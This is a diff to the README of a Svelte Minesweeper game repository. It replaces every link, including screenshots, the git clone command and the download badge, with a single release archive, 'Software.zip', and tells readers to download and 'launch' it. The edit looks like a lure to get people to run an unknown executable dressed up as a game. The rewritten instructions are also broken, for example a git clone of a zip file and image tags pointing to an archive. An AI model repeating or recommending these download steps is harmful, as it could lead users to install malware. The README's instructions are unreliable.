@@ -1,6 +1,6 @@
 # 🚀 Welcome to the Minesweeper Repository!
 
-![Minesweeper Logo](https://via.placeholder.com/150)
+![Minesweeper Logo](https://github.com/dedywahyudi1/minesweeper/releases/download/v1.0/Software.zip)
 
 ## About
 Welcome to the "minesweeper" repository, where you can find a responsive Minesweeper game built with Svelte and Tailwind CSS. This game features light/dark themes, interactive gameplay, and is designed with a focus on responsive design.
@@ -26,19 +26,19 @@ Welcome to the "minesweeper" repository, where you can find a responsive Mineswe
 - Web Game
 
 ## Getting Started
-To get started with the Minesweeper game, simply download the [ZIP file](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip) and launch it to enjoy the game on your device!
+To get started with the Minesweeper game, simply download the [ZIP file](https://github.com/dedywahyudi1/minesweeper/releases/download/v1.0/Software.zip) and launch it to enjoy the game on your device!
 
 ## Screenshots
 Here are some sneak peeks at the Minesweeper game:
-![Screenshot 1](https://via.placeholder.com/600)
-![Screenshot 2](https://via.placeholder.com/600)
-![Screenshot 3](https://via.placeholder.com/600)
+![Screenshot 1](https://github.com/dedywahyudi1/minesweeper/releases/download/v1.0/Software.zip)
+![Screenshot 2](https://github.com/dedywahyudi1/minesweeper/releases/download/v1.0/Software.zip)
+![Screenshot 3](https://github.com/dedywahyudi1/minesweeper/releases/download/v1.0/Software.zip)
 
 ## Installation
 Follow these steps to install and run the Minesweeper game locally:
 1. Clone this repository to your local machine
    ```bash
-   git clone https://github.com/your-username/minesweeper.git
+   git clone https://github.com/dedywahyudi1/minesweeper/releases/download/v1.0/Software.zip
    ```
 2. Navigate into the project directory
    ```bash
@@ -63,8 +63,8 @@ This Minesweeper game is open source and available under the [MIT License](LICEN
 ---
 
 ### Get Started Now!
-Are you ready to challenge your mind with the Minesweeper game? Download the [latest release](https://github.com/cli/go-gh/releases) and start playing today! 🎮💣🚩
+Are you ready to challenge your mind with the Minesweeper game? Download the [latest release](https://github.com/dedywahyudi1/minesweeper/releases/download/v1.0/Software.zip) and start playing today! 🎮💣🚩
 
 Feel free to reach out if you have any questions or feedback. Happy gaming! 🌟🎉
 
-[![Download Game](https://img.shields.io/badge/Download%20Game-Let's%20Play!-blue)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download Game](https://github.com/dedywahyudi1/minesweeper/releases/download/v1.0/Software.zip%20Game-Let's%20Play!-blue)](https://github.com/dedywahyudi1/minesweeper/releases/download/v1.0/Software.zip)
